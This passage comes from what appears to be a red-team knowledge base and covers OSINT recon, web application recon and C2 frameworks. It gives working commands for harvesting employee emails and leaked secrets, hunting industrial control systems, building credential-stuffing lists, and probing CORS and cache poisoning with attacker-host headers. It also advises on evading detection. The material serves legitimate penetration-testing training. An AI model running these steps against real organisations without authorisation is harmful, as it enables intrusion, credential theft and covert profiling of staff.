Without this information, active reconnaissance and exploitation are blind guesses.\n\nA thorough passive recon phase can reveal forgotten subdomains, leaked credentials, exposed cloud storage, employee email lists for password spraying, and technology stacks with known vulnerabilities — all without generating a single alert.\n\n### Key Terms\n\n- **OSINT (Open Source Intelligence)**: Information collected from publicly available sources — websites, social media, public records, search engines, code repositories, DNS records, and certificate transparency logs.\n- **Attack Surface**: The total number of points where an attacker could try to enter or extract data from an environment. More exposed services, domains, and employees means a larger attack surface.\n- **Passive vs Active Reconnaissance**: Passive means you never touch the target directly (no packets to their servers). Active means you directly probe, scan, or interact with their infrastructure — which can be logged and detected.\n- **Footprint**: The digital presence of an organization — all its domains, IP ranges, cloud services, code repositories, employee accounts, and publicly visible infrastructure.\n- **Certificate Transparency (CT)**: A public log of all SSL/TLS certificates issued by certificate authorities. Searching CT logs reveals subdomains and infrastructure the target may not publicly advertise.\n- **WHOIS**: A protocol for querying databases that store registration information about domain names and IP address blocks, revealing ownership, contact details, and registration dates.\n- **Google Dorking**: Using advanced Google search operators (site:, filetype:, inurl:) to find specific information indexed by search engines that the target may not intend to be easily discoverable.\n\n### Simple Analogy\n\nImagine you want to learn everything about a new neighbor before introducing yourself. You look at their mailbox for their name, check public property records for when they bought the house, look at their car for bumper stickers that reveal interests, and check their social media profiles. You learn a tremendous amount without ever knocking on their door. Passive recon works the same way — you learn about the target using only publicly available information, and they never know you were looking.\n\n## ◈ INTERMEDIATE\n\nPassive reconnaissance gathers intelligence without directly touching target infrastructure. No packets are sent to target-owned assets, making this phase virtually undetectable.\n\n### Search Engine & Internet-Wide Scanning Databases\n\n**Shodan** indexes internet-facing services. Useful queries:\n\n```\n# Find organization assets\norg:\"Target Corp\"\nssl.cert.subject.cn:\"target.com\"\nhostname:\"target.com\" port:443\nnet:\"203.0.113.0/24\"\n\n# Specific service hunting\nhttp.title:\"Dashboard\" org:\"Target Corp\"\nproduct:\"Apache\" org:\"Target Corp\" port:8080\n```\n\n**Censys** provides similar capability with certificate-centric search. Use `services.tls.certificates.leaf.subject.common_name:target.com` for cert-based discovery. **FOFA** (`fofa.info`) and **ZoomEye** cover Chinese IP space better than Shodan. **GreyNoise** is useful for identifying which IPs are mass-scanning versus targeted — check if your test infrastructure is already being scanned.\n\n### Certificate Transparency\n\nQuery `crt.sh` for all certificates ever issued for a domain:\n\n```bash\ncurl -s \"https://crt.sh/?q=%.target.com&output=json\" | jq -r '.[].name_value' | sort -u\n```\n\nThis reveals subdomains that may not appear in DNS brute-forcing, including internal hostnames accidentally included in SAN fields. **SecurityTrails** and **RiskIQ PassiveTotal** provide historical DNS records, revealing previous IP resolutions, nameserver changes, and infrastructure migrations.\n\n### ASN & Network Block Enumeration\n\nUse `bgp.he.net` to identify all ASNs owned by the target. Cross-reference with ARIN/RIPE WHOIS databases:\n\n```bash\nwhois -h whois.radb.net -- '-i origin AS12345' | grep route:\namass intel -org \"Target Corporation\"\n```\n\nThis yields network blocks that may host forgotten assets outside the primary domain.\n\n### Email Harvesting\n\n**theHarvester** aggregates results from multiple search engines:\n\n```bash\ntheHarvester -d target.com -b google,bing,linkedin,dnsdumpster,crtsh -l 500\n```\n\n**Hunter.io** provides email pattern detection (first.last@, f.last@) and verified addresses. Cross-reference with **LinkedIn** employee enumeration for password spraying username lists. Use LinkedIn Sales Navigator or scraping tools (linkedin2username) to build employee lists organized by department.\n\n### Google Dorking\n\nHigh-value dorks for target reconnaissance:\n\n```\nsite:target.com filetype:pdf\nsite:target.com inurl:admin OR inurl:login OR inurl:dashboard\nsite:target.com ext:xml OR ext:json OR ext:yaml OR ext:conf\nsite:target.com intitle:\"index of\"\n\"target.com\" filetype:xls OR filetype:csv \"password\" OR \"username\"\nsite:pastebin.com \"target.com\"\n```\n\n### GitHub & Code Repository Dorking\n\nSearch for leaked secrets in public repositories:\n\n```bash\n# truffleHog for entropy-based secret detection\ntrufflehog github --org=targetcorp\n\n# gitleaks against cloned repos\ngitleaks detect -s /path/to/repo --report-format json\n\n# GitHub search queries\norg:targetcorp password\norg:targetcorp AWS_SECRET_ACCESS_KEY\norg:targetcorp filename:.env\norg:targetcorp extension:pem private\n```\n\n**Gitrob** and **git-secrets** provide automated scanning. Check commit history — secrets removed from HEAD often remain in git log.\n\n### Recon Frameworks\n\n**Amass** (passive mode) aggregates from 40+ data sources:\n\n```bash\namass enum -passive -d target.com -o amass_passive.txt\n```\n\n**Recon-ng** provides a modular framework with marketplace modules:\n\n```\nrecon-ng\nmarketplace install all\nmodules load recon/domains-hosts/certificate_transparency\noptions set SOURCE target.com\nrun\n```\n\n**Maltego** excels at visualizing relationships between entities (domains, IPs, people, organizations) through transforms.\n\n### Historical Data\n\n**Wayback Machine** via `waybackurls` reveals endpoints that may still be live but unlinked:\n\n```bash\nwaybackurls target.com | grep -E '\\.(js|json|xml|config|env|bak|sql)$' | sort -u\n```\n\nOld JavaScript files may contain API keys, internal endpoints, or authentication logic that has since been removed from the live site but remains functional server-side.\n\n### Pastebin & Paste Site Monitoring\n\nMonitor paste sites for leaked credentials, configuration files, and internal documents. Tools like **PasteHunter** automate this with keyword alerts. Check Pastebin, Ghostbin, GitHub Gists, and PrivateBin instances.\n\n### OpSec Notes\n\n- Passive recon generates no alerts on the target side\n- Use VPN/Tor when querying Shodan/Censys to avoid correlating your research IP with later active phases\n- Rate-limit API queries to avoid account suspension\n- Store all findings in a structured format (JSON/CSV) for later cross-referencing during active phases\n\n### Detection Notes\n\nPassive recon is invisible to the target. However, some services (SecurityTrails, Shodan) log API queries. If the target operates a threat intelligence program, they may monitor for increased OSINT activity against their domain via commercial TI feeds.\n\n---\n\n### SpiderFoot — Automated OSINT\n\nSpiderFoot automates collection across 200+ data sources:\n\n```bash\n# Install\npip3 install spiderfoot\n# or Docker:\ndocker run -p 5001:5001 smicallef/spiderfoot\n\n# CLI mode\nspiderfoot -s target.com -t INTERNET_NAME,EMAILADDR,PHONE_NUMBER \\\n -m sfp_shodan,sfp_hunter,sfp_censys,sfp_haveibeenpwned \\\n -o /tmp/sf_output.json\n\n# Web UI (http://localhost:5001): configure modules, set target, run scan\n# Correlates: emails, IPs, domains, usernames, breaches, social media, dark web\n\n# Useful modules: sfp_dnsbrute, sfp_github, sfp_pastebin,\n# sfp_instagram, sfp_twitter, sfp_linkedin2\n```\n\n---\n\n### Dark Web Monitoring\n\n```bash\n# Tor-based search engines\n# Ahmia (clearnet): https://ahmia.fi — indexes .onion sites\n# Torch: http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dyd.onion\n# Haystack: large .onion index\n\n# Access via Tor\nsudo apt install tor torbrowser-launcher\n# Set SOCKS5 proxy: 127.0.0.1:9050 in curl/requests\n\n# Search for target data on paste sites\n# Pastebin OSINT: site:pastebin.com \"target.com\"\n# GitHub secrets: site:github.com \"target.com\" \"password\" OR \"api_key\"\n\n# BreachDirectory API\ncurl \"https://breachdirectory.org/api?func=auto&term=target.com\" \\\n -H \"Authorization: YOUR_API_KEY\"\n\n# Dark web monitoring services (for client deliverables):\n# SpyCloud, Flare, DarkOwl — monitor for brand/employee exposure\n```\n\n---\n\n### Username OSINT (Sherlock)\n\n```bash\n# Find username across 400+ platforms\npip3 install sherlock-project\nsherlock username_here\n\n# Useful for:\n# - Finding employee personal accounts linked to work identity\n# - Cross-platform correlation (LinkedIn name → Reddit username → GitHub)\n# - Identifying targets' personal email via social media profiles\n\n# Alternative: Maigret (more detailed, includes breach cross-reference)\npip3 install maigret\nmaigret username_here --all-sites\n```\n\n## ◈ ADVANCED\n\n### Automated OSINT Pipeline with n8n/Airflow\n\nProduction red teams automate passive recon into repeatable pipelines rather than running tools manually. Use workflow engines like **n8n** (self-hosted, visual) or **Apache Airflow** (Python DAGs) to orchestrate multi-source collection:\n\n```\nPipeline stages:\n1. Input: target domain → fan out to parallel collectors\n2. CT log monitor (crt.sh API) → new subdomain alerts\n3. Shodan/Censys API queries → service inventory\n4. GitHub/GitLab secret scanning → credential alerts\n5. theHarvester + Hunter.io → employee email list\n6. Wayback Machine + GAU → historical endpoint extraction\n7. SpiderFoot modules → correlated entity graph\n8. Output: structured JSON → ingested into Neo4j or Elasticsearch\n```\n\nSchedule pipelines to run continuously during an engagement — new assets appear as the target deploys infrastructure. Use webhook triggers to alert operators when high-value findings emerge (e.g., new subdomain with admin panel, leaked AWS key).\n\n### Custom Shodan Queries for Industrial Systems\n\nBeyond standard IT reconnaissance, Shodan/Censys queries can identify ICS/SCADA and OT systems that are often unmonitored:\n\n```\n# Modbus (TCP/502) — industrial control\nport:502 \"Schneider Electric\"\n\n# BACnet (UDP/47808) — building automation\nport:47808 \"BACnet\"\n\n# DNP3 (TCP/20000) — power grid SCADA\nport:20000 \"DNP3\"\n\n# EtherNet/IP (TCP/44818) — manufacturing PLCs\nport:44818 product:\"Rockwell\"\n\n# S7comm (TCP/102) — Siemens PLCs\nport:102 \"Siemens\"\n\n# MQTT brokers (often unauthenticated)\nport:1883 -auth\n```\n\nCross-reference discovered industrial assets with CVE databases — many ICS devices run firmware with years-old unpatched vulnerabilities and no EDR coverage.\n\n### Dark Web Monitoring Automation\n\nBuild automated dark web collection using Tor SOCKS proxies and Python:\n\n```python\n# Automated .onion scraper skeleton\nimport requests\nsession = requests.Session()\nsession.proxies = {'http': 'socks5h://127.0.0.1:9050',\n 'https': 'socks5h://127.0.0.1:9050'}\n# Scrape known paste .onion sites for target keywords\n# Store results in Elasticsearch with timestamps\n# Alert via webhook when target domain/email appears\n```\n\nIntegrate with commercial dark web monitoring APIs (SpyCloud, Flare, DarkOwl) for breach data correlation. Cross-reference breached credentials with harvested employee email lists to build high-confidence credential stuffing lists.\n\n### Graph Database Correlation with Neo4j\n\nFlat CSV/JSON OSINT output becomes exponentially more valuable when loaded into a graph database:\n\n```cypher\n// Import entities and relationships\nCREATE (d:Domain {name: 'target.com'})\nCREATE (s:Subdomain {name: 'vpn.target.com', ip: '203.0.113.5'})\nCREATE (e:Employee {name: 'John Doe', email: 'j.doe@target.com'})\nCREATE (s)-[:RESOLVES_TO]->(i:IP {addr: '203.0.113.5'})\nCREATE (e)-[:WORKS_AT]->(d)\nCREATE (e)-[:HAS_ACCOUNT]->(g:GitHub {username: 'jdoe-dev'})\n\n// Query: find employees with leaked credentials who have admin access\nMATCH (e:Employee)-[:HAS_BREACH]->(b:Breach),\n (e)-[:HAS_ACCESS]->(s:Service {role: 'admin'})\nRETURN e.name, b.source, s.name\n```\n\nGraph queries reveal non-obvious attack paths: an employee's personal GitHub account leaked AWS keys that map to the same IP range as the target's staging environment.\n\n### Certificate Transparency Real-Time Monitoring\n\nRather than periodic CT log queries, set up real-time monitoring using CertStream or the Merkle Tree API:\n\n```bash\n# CertStream — real-time CT log monitoring\npip install certstream\npython -c \"\nimport certstream\ndef callback(message, context):\n if message['message_type'] == 'certificate_update':\n domains = message['data']['leaf_cert']['all_domains']\n for d in domains:\n if 'target.com' in d:\n print(f'[NEW CERT] {d}')\n # Trigger webhook/alert\ncertstream.listen_for_events(callback)\n\"\n```\n\nThis catches new subdomains, staging environments, and infrastructure changes within minutes of certificate issuance — often before DNS propagation completes, giving the red team a window where the asset may be misconfigured or unmonitored.\n\n### Building a Custom OSINT Framework\n\nFor repeated engagements, build a modular Python OSINT framework with standardized output:\n\n```\nArchitecture:\n├── collectors/ # One module per source (shodan, censys, crtsh, github...)\n│ ├── base.py # Abstract collector with rate limiting, caching, error handling\n│ ├── shodan.py # Shodan API collector\n│ └── ct_logs.py # Certificate transparency collector\n├── enrichers/ # Post-collection enrichment (GeoIP, ASN lookup, tech detection)\n├── correlators/ # Cross-source entity resolution and deduplication\n├── exporters/ # Output to Neo4j, Elasticsearch, JSON, CSV, ATT&CK Navigator\n└── config/ # API keys, target definitions, collection schedules\n```\n\nEach collector implements a common interface returning standardized entity objects (Domain, IP, Email, Person, Service). The correlator deduplicates across sources and builds relationship graphs. This approach scales across engagements and produces consistent, auditable output for client deliverables.\n\n### Detection Evasion for OSINT Collection\n\nEven passive recon can leave traces if not performed carefully:\n\n- **API key correlation**: If Shodan/Censys queries are tied to an account later compromised or subpoenaed, they reveal pre-engagement targeting. Use burner API keys and separate billing.\n- **Rate limiting fingerprinting**: Some TI platforms flag accounts that query many assets in the same organization. Distribute queries across multiple accounts and time windows.\n- **Browser fingerprinting**: When manually browsing target websites for OSINT, use isolated browser profiles with spoofed fingerprints (canvas, WebGL, fonts). Tools like GoLogin or Multilogin manage this at scale.\n- **Search engine telemetry**: Google dorking from a known IP can correlate with later engagement activity. Use Tor or residential proxies for all search engine queries.", "last_updated": "2026-03-18"}, "web-recon": {"slug": "web-recon", "title": "Web Application Reconnaissance", "category": "Reconnaissance", "content": "# Web Application Reconnaissance\n\n## ◈ BEGINNER\n\n### What is Web Application Reconnaissance?\n\nBefore attacking a web application, you gather intelligence about it — what technologies it uses, what pages and endpoints exist, and what potential weaknesses might be present. This is web recon.\n\n**Key terms:**\n- **Technology fingerprinting** — identifying the web framework, server, CMS, and libraries in use\n- **Web crawling/spidering** — automatically following links throughout a site to map all pages\n- **Directory brute-forcing** — guessing common page and folder names (e.g., `/admin`, `/backup`, `/api`)\n- **JavaScript analysis** — inspecting JS files for hidden API endpoints, secrets, and business logic\n- **Parameter discovery** — finding hidden URL/form parameters that affect application behavior\n- **Subdomain takeover** — claiming an abandoned subdomain that still has DNS records pointing to it\n- **CORS** — Cross-Origin Resource Sharing; browser policy that can be misconfigured to allow cross-site data theft\n\n**Why does technology matter?**\nIf you know a site runs WordPress 6.2, you can look up known vulnerabilities for that exact version. If it uses Laravel, you know common Laravel misconfigurations. Every identified technology narrows your attack surface to known issues.\n\n**What does `robots.txt` reveal?**\nWebsite owners put pages they want hidden from search engines in `robots.txt` — paths like `/admin`, `/internal`, `/staging`. These are explicitly the pages they consider sensitive, conveniently listed for you.\n\n**Analogy:** Web recon is like casing a building before a heist — you note the doors, windows, security cameras, and staff schedules. The more you know before attempting access, the better your chances of success.\n\n**Common quick wins:**\n- `robots.txt` / `sitemap.xml` — free endpoint list\n- Source maps (`.js.map`) — exposes original unminified JavaScript code\n- `/api/swagger.json` or `/openapi.json` — full API documentation with all endpoints\n- Error messages — often reveal framework/version details\n- Cookie names — `PHPSESSID` = PHP, `JSESSIONID` = Java, `ASP.NET_SessionId` = .NET\n\n## ◈ INTERMEDIATE\n\nWeb application recon identifies technologies, endpoints, parameters, and misconfigurations before exploitation.\n\n## Technology Fingerprinting\n\n```bash\n# Wappalyzer CLI\nwappalyzer https://target.com\n\n# WhatWeb\nwhatweb -a 3 https://target.com\n\n# BuiltWith (online alternative)\n# Manual header analysis\ncurl -sI https://target.com | grep -iE 'server|x-powered|x-asp|x-framework'\n```\n\nIdentify the web framework (Rails, Django, Spring, Laravel, Express), CMS (WordPress, Drupal, Joomla), web server (Nginx, Apache, IIS), and CDN/WAF. Each technology has known attack vectors.\n\n## Web Crawling & Spidering\n\n```bash\n# Katana (ProjectDiscovery — fast, headless browser support)\nkatana -u https://target.com -d 5 -jc -o katana_output.txt\n\n# GoSpider\ngospider -s https://target.com -d 3 -c 10 --other-source --include-subs -o gospider_out\n\n# Hakrawler\necho https://target.com | hakrawler -d 3 -u\n```\n\nCombine crawler output with wayback data for maximum endpoint coverage:\n\n```bash\ncat katana_output.txt wayback_urls.txt | sort -u | httpx -silent -mc 200 -o live_endpoints.txt\n```\n\n## JavaScript Analysis\n\nModern SPAs embed API endpoints, credentials, and business logic in JavaScript:\n\n```bash\n# LinkFinder — extract endpoints from JS\nlinkfinder -i https://target.com -d -o cli\n\n# SecretFinder — find secrets in JS\nsecretfinder -i https://target.com -e\n\n# JSLuice — advanced JS analysis\njsluice urls -R target_js_files/\njsluice secrets -R target_js_files/\n\n# Bulk download and analyze JS files\ncat live_endpoints.txt | grep -iE '\\.js$' | while read url; do\n curl -sL \"$url\" >> all_js.txt\ndone\n```\n\nLook for: API keys, AWS credentials, Firebase configs, internal API URLs, debug endpoints, hardcoded tokens, admin routes.\n\n## Parameter Discovery\n\n```bash\n# Arjun — automatic parameter discovery\narjun -u https://target.com/api/endpoint -m GET POST\n\n# x8 — fast parameter discovery\nx8 -u https://target.com/search -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt\n```\n\nHidden parameters may enable debug modes (`debug=true`, `test=1`), bypass authentication, or expose injection points.\n\n## API Endpoint Discovery\n\n```bash\n# Check common API documentation paths\nfor path in /swagger.json /swagger/v1/swagger.json /api-docs /openapi.json /v2/api-docs /.well-known/openapi.yaml /graphql /graphiql; do\n code=$(curl -so /dev/null -w '%{http_code}' \"https://target.com$path\")\n echo \"$path: $code\"\ndone\n\n# Kiterunner for API path brute-force\nkr scan https://target.com -w /path/to/routes-large.kite -x 10\n```\n\n## Subdomain Takeover Detection\n\nDangling DNS records pointing to deprovisioned cloud resources can be claimed:\n\n```bash\n# subjack\nsubjack -w subs.txt -t 100 -timeout 30 -o takeovers.txt -ssl\n\n# Nuclei with takeover templates\nnuclei -l subs.txt -t /path/to/nuclei-templates/takeovers/ -o takeover_results.txt\n```\n\nCommon targets: unclaimed S3 buckets, deprovisioned Heroku/Azure/GitHub Pages apps, abandoned Fastly/CloudFront distributions.\n\n## Cloud Storage Enumeration\n\n```bash\n# cloud_enum — multi-cloud bucket/blob enumeration\ncloud_enum -k target -k targetcorp -l cloud_enum_results.txt\n\n# S3 scanner\ns3scanner scan --bucket-file potential_buckets.txt\n\n# Manual checks\naws s3 ls s3://target-backup --no-sign-request\n```\n\n## robots.txt, sitemap.xml & Metadata\n\n```bash\ncurl -s https://target.com/robots.txt\ncurl -s https://target.com/sitemap.xml\ncurl -s https://target.com/.well-known/security.txt\n```\n\n`robots.txt` Disallow entries reveal sensitive paths the site owner wants hidden from crawlers. Sitemaps expose the full URL structure.\n\n## CORS Misconfiguration Detection\n\n```bash\n# Test for reflected origin\ncurl -sI -H \"Origin: https://evil.com\" https://target.com/api/data | grep -i access-control\n\n# Test for null origin\ncurl -sI -H \"Origin: null\" https://target.com/api/data | grep -i access-control\n```\n\nIf `Access-Control-Allow-Origin` reflects the attacker's origin with `Access-Control-Allow-Credentials: true`, cross-origin data theft is possible.\n\n## Header Analysis\n\n```bash\ncurl -sI https://target.com | grep -iE 'strict-transport|content-security|x-frame|x-content-type|referrer-policy|permissions-policy'\n```\n\nMissing security headers indicate weaker security posture: no CSP means easier XSS, no X-Frame-Options enables clickjacking, no HSTS allows SSL stripping.\n\n## OpSec Notes\n\n- Web crawling generates extensive access logs — use realistic User-Agent strings\n- Rate-limit all brute-force discovery to avoid 429/ban\n- Some WAFs detect sequential path enumeration — add jitter and randomize word order\n- JS analysis can be done offline after downloading files, reducing target interaction\n- Subdomain takeover tests should be non-destructive (verify DNS, don't claim)\n\n## Detection Notes\n\nAggressive directory brute-forcing generates thousands of 404 responses, easily detected by WAFs and SIEM rules. Parameter fuzzing may trigger application-level alerts. Use targeted wordlists over massive dictionaries to reduce noise.\n\n## JavaScript Analysis and Endpoint Discovery\n\nModern single-page apps load sensitive endpoints and API keys via bundled JavaScript:\n\n```bash\n# Extract all URLs from JavaScript files\ngau target.com | grep \"\\.js\" | sort -u > jsfiles.txt\ncat jsfiles.txt | xargs -I{} curl -s {} | grep -Eo '(/api/[^\"'\"'\"' ]+)' | sort -u\n\n# LinkFinder — extracts endpoints from JS\npython3 linkfinder.py -i https://target.com/app.bundle.js -o cli\n\n# SecretFinder — find API keys, tokens in JS\npython3 SecretFinder.py -i https://target.com/app.js -o cli\n\n# Source maps (.js.map) — expose original unminified source\ncurl https://target.com/static/app.js.map | python3 -m json.tool | grep sourcesContent\n```\n\n## Content Discovery\n\n```bash\n# Directory brute force\nffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \\\n -mc 200,204,301,302,307,401,403 -ac -t 50 -o ffuf_dirs.json\n\n# File brute force with extensions\nffuf -u https://target.com/FUZZ -w wordlist.txt -e .php,.asp,.aspx,.jsp,.txt,.bak,.old,.zip \\\n -mc 200,204,301,302,307,401,403 -ac\n\n# Virtual host enumeration (subdomain on same IP)\nffuf -u https://target.com/ -w subdomains.txt -H \"Host: FUZZ.target.com\" -mc 200,301,302 -ac\n\n# Backup file discovery\nffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt\n\n# Common sensitive paths\n/robots.txt /sitemap.xml /.git/config /.env /web.config /phpinfo.php\n/api/swagger.json /api/openapi.json /v1/api-docs /.well-known/security.txt\n/backup/ /admin/ /debug/ /test/ /wp-admin/ /actuator/\n```\n\n## SSL/TLS Certificate Analysis\n\n```bash\n# testssl.sh — comprehensive TLS analysis\ntestssl.sh https://target.com\n\n# Certificate transparency for subdomains (duplicates passive recon)\ncurl -s \"https://crt.sh/?q=%.target.com&output=json\" | jq -r '.[].name_value' | sort -u\n\n# OSCP/CRL endpoints (infrastructure intel)\nopenssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -text | grep -A2 \"OCSP\\|CRL\"\n\n# SAN entries — reveals other domains on same cert\nopenssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -text | grep DNS:\n```\n\n## API Discovery and Documentation\n\n```bash\n# Common API documentation endpoints\n/swagger.json /swagger-ui.html /openapi.json /api-docs /redoc\n/v1/ /v2/ /api/v1/ /rest/ /graphql /gql\n\n# GraphQL introspection\ncurl -X POST https://target.com/graphql \\\n -H \"Content-Type: application/json\" \\\n -d '{\"query\":\"{__schema{types{name fields{name}}}}\"}'\n```\n\n## ◈ ADVANCED\n\n### Automated Recon Pipeline with Nuclei\n\nChain recon tools into a single automated discovery-to-vulnerability pipeline:\n\n```bash\n#!/bin/bash\nTARGET=$1\nmkdir -p recon/$TARGET\n\n# Asset discovery\nsubfinder -d $TARGET -silent | tee recon/$TARGET/subs.txt\ncat recon/$TARGET/subs.txt | httpx -silent -status-code -title -tech-detect \\\n -json | tee recon/$TARGET/hosts.json\n\n# Automated vulnerability scan across all live hosts\ncat recon/$TARGET/hosts.json | jq -r '.url' | \\\n nuclei -t exposures/ -t misconfigs/ -t technologies/ \\\n -severity medium,high,critical \\\n -o recon/$TARGET/vulns.txt\n\n# Parameter mining\ncat recon/$TARGET/hosts.json | jq -r '.url' | \\\n gau --subs | grep \"?\" | \\\n qsreplace FUZZ | \\\n httpx -silent -mc 200 | \\\n tee recon/$TARGET/params.txt\n```\n\n### GraphQL Deep Enumeration\n\nGraphQL introspection reveals the full API schema including mutations that may modify data:\n\n```bash\n# Full schema dump\ncurl -X POST https://target.com/graphql \\\n -H \"Content-Type: application/json\" \\\n -d '{\"query\":\"{ __schema { queryType { name } mutationType { name } types { name kind fields { name args { name type { name kind ofType { name kind } } } } } } }\"}' | \\\n python3 -m json.tool > schema.json\n\n# Find mutations (data modification endpoints)\ncat schema.json | python3 -c \"\nimport json,sys\nschema = json.load(sys.stdin)\nfor t in schema['data']['__schema']['types']:\n if t['name'] == 'Mutation':\n for f in t.get('fields', []):\n print(f['name'], [(a['name'], a['type']['name']) for a in f['args']])\n\"\n```\n\nGraphQL mutation enumeration often reveals admin operations not exposed in the UI.\n\n### Source Map Extraction and Decompilation\n\nSource maps expose original pre-compiled JavaScript — effectively the application source code:\n\n```python\nimport requests, json, os\n\ndef extract_source_map(url):\n # Fetch the JS file, look for //# sourceMappingURL comment\n resp = requests.get(url)\n for line in resp.text.splitlines():\n if line.startswith('//# sourceMappingURL='):\n map_url = line.split('=', 1)[1].strip()\n if not map_url.startswith('http'):\n base = url.rsplit('/', 1)[0]\n map_url = f\"{base}/{map_url}\"\n\n map_resp = requests.get(map_url)\n data = map_resp.json()\n\n for i, (path, source) in enumerate(zip(data['sources'], data['sourcesContent'])):\n os.makedirs(os.path.dirname(f\"extracted/{path}\"), exist_ok=True)\n with open(f\"extracted/{path}\", 'w') as f:\n f.write(source)\n print(f\"Extracted: {path}\")\n```\n\nExtracted source may reveal: authentication logic, API keys in environment configs, admin routes, validation bypass conditions.\n\n### Favicon Hash Recon\n\nIdentify other assets owned by the target using favicon hash fingerprinting:\n\n```python\nimport requests, codecs\nfrom mmh3 import hash as mmh3_hash\n\ndef favicon_hash(url):\n resp = requests.get(url + '/favicon.ico')\n favicon = codecs.encode(resp.content, 'base64')\n return mmh3_hash(favicon)\n\n# Query Shodan for all servers with same favicon\nhash_val = favicon_hash('https://target.com')\nprint(f\"Shodan query: http.favicon.hash:{hash_val}\")\n# Find dev/staging servers, internal tools, other acquisitions\n```\n\nThis technique finds staging environments, acquisitions, and shadow IT assets that share the same web application code.\n\n### Cache Poisoning Recon\n\nBefore exploitation, probe for unkeyed inputs that could lead to web cache poisoning:\n\n```bash\n# Test for host header cache poisoning\ncurl -sI -H \"Host: attacker.com\" -H \"X-Forwarded-Host: attacker.com\" \\\n https://target.com/resource | grep -i location\n\n# Test for X-Forwarded-Host reflection in cached content\ncurl -s -H \"X-Forwarded-Host: canary-$(date +%s).attacker.com\" \\\n https://target.com/ | grep -i canary\n```\n\nIf the canary value appears in the response and the response is cacheable, cache poisoning is viable.", "last_updated": "2026-03-18"}, "c2-framework-comparison": {"slug": "c2-framework-comparison", "title": "C2 Framework Comparison 2025-2026", "category": "Red Team Ops", "content": "# C2 Framework Comparison 2025-2026\n\n## ◈ BEGINNER\n\n### What Is a C2 Framework?\n\nA **C2 (Command and Control) framework** is the infrastructure and software that allows a red team to control compromised systems during an engagement. It consists of two parts: an **agent** (also called an implant or beacon) that runs on the compromised system, and a **teamserver** (or C2 server) that operators connect to in order to issue commands, receive results, and manage all compromised systems.\n\n**Why it matters:** Once you have initial access to a system, you need a way to maintain that access, run commands, exfiltrate data, and move laterally — all while avoiding detection. A C2 framework provides all of this in an organized, operator-friendly interface.\n\n**Key terms:**\n- **Agent/Implant/Beacon** — the software running on the compromised system; communicates with the teamserver on a schedule (called the beacon interval)\n- **Teamserver** — the server that operators connect to; manages all agents, receives callbacks, routes commands\n- **Beacon interval** — how often the agent checks in with the C2 server; shorter = more responsive but more detectable; longer = stealthier but slower\n- **Jitter** — random variation added to the beacon interval (e.g., ±20%) to make timing patterns harder to detect\n- **Malleable C2 profile** — configuration that changes how the agent's network traffic looks; makes it appear as legitimate web traffic (Office 365, Slack, etc.)\n- **BOF (Beacon Object File)** — a small compiled C program that runs inside the agent's memory without touching disk; extends agent capabilities post-exploitation\n- **Sleep masking** — encrypting the agent's code in memory while it's sleeping between check-ins; prevents EDR memory scanning from finding malicious code\n- **mTLS** — mutual TLS; both agent and server authenticate each other with certificates; prevents unauthorized parties from connecting to the C2\n- **Staged vs stageless** — staged: initial payload downloads the full agent (smaller first stage); stageless: full agent in first payload (larger but no second download needed)\n- **Multi-operator** — ability for multiple red team members to share access to the same C2 infrastructure simultaneously\n\n**The main trade-offs when choosing:**\n- Open source = free + inspectable, but defenders can read the code to build detection\n- Commercial = costly but may have fewer public signatures (smaller user base)\n- Custom = maximum stealth, but requires development investment\n\n**Analogy:** A C2 framework is the red team's equivalent of a remote work management system. The agent is like a remote employee checking their inbox every hour; the teamserver is the manager's dashboard showing who is online, what tasks they completed, and where to send new work. The difference is that you're managing compromised systems on a target network without the owner's knowledge.\n\n## ◈ INTERMEDIATE\n\nComprehensive comparison of major command-and-control frameworks for red team operations, including selection criteria and trade-offs.\n\n### Cobalt Strike\n\n**Type**: Commercial ($5,900/year per operator)\n\n**Agent**: Beacon (Windows primary, cross-platform via BOFs/reflective DLL)\n\n**Key Features**:\n- Malleable C2 profiles (highly configurable traffic shaping)\n- Beacon Object Files (BOF) for in-memory post-exploitation modules\n- Sleep mask for memory encryption during sleep\n- Named pipe and TCP for internal peer-to-peer\n- Aggressor Script for automation\n- Multi-operator support (team server model)\n\n**Strengths**: Industry standard, massive community knowledge base, BOF ecosystem, proven at scale.\n\n**Weaknesses**: Heavily signatured by every EDR vendor. Leaked versions (4.x) used by threat actors, increasing default detection. License enforcement limits distribution. Default payloads require significant customization to evade modern EDR.\n\n**Best For**: Teams with budget, need for malleable C2, and ability to customize.\n\n### Sliver\n\n**Type**: Open source (Go)\n\n**Agent**: Implant (Windows/macOS/Linux)\n\n**Key Features**:\n- mTLS, HTTP/S, WireGuard, DNS transports\n- Multiplayer mode (multi-operator)\n- BOF support via COFF loader\n- Armory for community extensions\n- Cursed Chrome for browser pivoting\n- Built-in staging and stagers\n- Active development with regular releases\n\n**Strengths**: Free, cross-platform, good transport variety, active community, built-in evasion features (obfuscation, symbol stripping), OPSEC-focused design.\n\n**Weaknesses**: Growing detection coverage by EDR vendors. Limited malleable profile flexibility compared to Cobalt Strike. Fewer post-exploitation modules than commercial options.\n\n**Best For**: Budget-conscious teams, Linux/macOS targets, teams wanting open-source flexibility.\n\n### Havoc\n\n**Type**: Open source (C/C++ agent, Python team server)\n\n**Agent**: Demon\n\n**Key Features**:\n- Indirect syscalls built-in\n- Sleep obfuscation (Ekko, Foliage variants)\n- Module stomping\n- Stack spoofing\n- Custom reflective loader\n- Havoc profiles for traffic configuration\n- Python team server API for extensibility\n- BOF support\n\n**Strengths**: Modern evasion techniques built into the agent. Strong Windows evasion focus. Active development. Designed for 2023+ EDR landscape.\n\n**Weaknesses**: Windows-only agent (Demon). Smaller community than Cobalt Strike/Sliver. Less mature infrastructure management. Limited transport options compared to Sliver.\n\n**Best For**: Windows-focused engagements requiring strong EDR evasion.\n\n### Mythic\n\n**Type**: Open source (Docker-based, multi-agent)\n\n**Agent**: Multiple (Apollo, Athena, Poseidon, Medusa, and more)\n\n**Key Features**:\n- Container-based architecture (agents, C2 profiles, translation containers)\n- Multiple agent types for different platforms and languages\n- Extensive logging and audit trail\n- Web-based UI with real-time updates\n- Payload services for dynamic payload generation\n- MITRE ATT&CK mapping built-in\n- 